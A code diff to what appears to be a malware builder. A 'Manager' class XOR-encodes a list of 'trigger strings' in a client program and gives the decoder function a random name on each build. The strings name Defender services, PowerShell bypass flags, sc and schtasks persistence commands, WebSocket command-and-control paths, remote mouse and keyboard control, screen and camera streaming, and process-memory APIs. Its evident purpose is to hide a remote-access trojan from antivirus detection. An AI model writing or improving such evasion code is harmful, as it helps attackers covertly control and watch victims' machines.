@@ -188,6 +188,14 @@ class Manager:
         raw = bytes(ord(c) ^ k[i % len(k)] ^ (i & 0xFF) for i, c in enumerate(s))
         return base64.b64encode(raw).decode()
 
+    def _gen_fn_name(self):
+        import string
+        letters = string.ascii_lowercase
+        name = "_" + "".join(_random.choice(letters) for _ in range(2))
+        while name in ("_s", "_ob", "_of", "_xb", "_id", "_is", "_in", "_or"):
+            name = "_" + "".join(_random.choice(letters) for _ in range(2))
+        return name
+
     _TRIGGER_STRINGS = [
         # — Defender / security products —
         "WinDefend", "Sense", "WdBoot", "WdFilter", "WdNisSvc", "MpPreference",
@@ -217,10 +225,10 @@ class Manager:
         # — PowerShell / command patterns —
         "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand",
         "-Enc", "-WindowStyle Hidden", "powershell.exe", "pwsh",
-        "Add-MpPreference", "Set-MpPreference", "Remove-WmiObject",
+        "Remove-WmiObject",
         # — Service control —
         "sc create", "sc config", "sc failure", "sc stop",
-        "binPath=", "start= auto", "WinDefend", "Sense",
+        "binPath=", "start= auto",
         # — schtasks —
         "schtasks /create", "/sc onlogon", "/sc minute", "/sc onstart", "/sc onidle",
         # — WMI —
@@ -244,6 +252,21 @@ class Manager:
         # — Network indicators —
         "websockets", "WebSocket", "ws://", "wss://",
         "/ws/client", "/ws/client_cam",
+        # — HID / input —
+        "do_move", "do_click", "do_key", "MouseController", "KeyboardController",
+        "mousemove", "mousedown", "mouseup",
+        # — Frame / streaming —
+        "createImageBitmap", "drawImage", "image/jpeg", "image/png",
+        "frame_interval", "min_quality", "max_quality", "quality_adj",
+        "_grab_screen_jpeg", "stream_loop", "camera_loop",
+        # — Thread / process —
+        "ThreadPoolExecutor", "asyncio.to_thread", "daemon=True",
+        "set_event_loop", "new_event_loop",
+        # — Memory / patching —
+        "NtQuerySystemInformation", "SystemHandleInformation", "VirtualQuery",
+        "VirtualProtect", "WriteProcessMemory", "ReadProcessMemory",
+        # — Common globals —
+        "DEVICE_ID", "HOSTNAME", "SERVER_IP", "SERVER_PORT",
     ]
 
     def _obfuscate_client(self):
@@ -262,15 +285,21 @@ class Manager:
         src = self._inject_key(src)
 
         changed = 0
+        fn_repl = self._gen_fn_name()
         for plain in self._TRIGGER_STRINGS:
             obf = self._xobf(plain)
             count = src.count(f'"{plain}"')
             if count:
-                src = src.replace(f'"{plain}"', f'_s("{obf}")')
+                src = src.replace(f'"{plain}"', f'{fn_repl}("{obf}")')
                 changed += count
+
+        # Rename _s() function definition + all calls to random name
+        src = src.replace("def _s(blob)", f"def {fn_repl}(blob)")
+        src = src.replace("_s(", f"{fn_repl}(")
+
         if changed:
             orig.write_text(src, "utf-8")
-            print(f"  [+] Obfuscated {changed} strings (key: {self._build_key.hex()[:8]}...)")
+            print(f"  [+] Obfuscated {changed} strings (fn: {fn_repl}, key: {self._build_key.hex()[:8]}...)")
         else:
             print("  [-] No trigger strings to obfuscate")
 
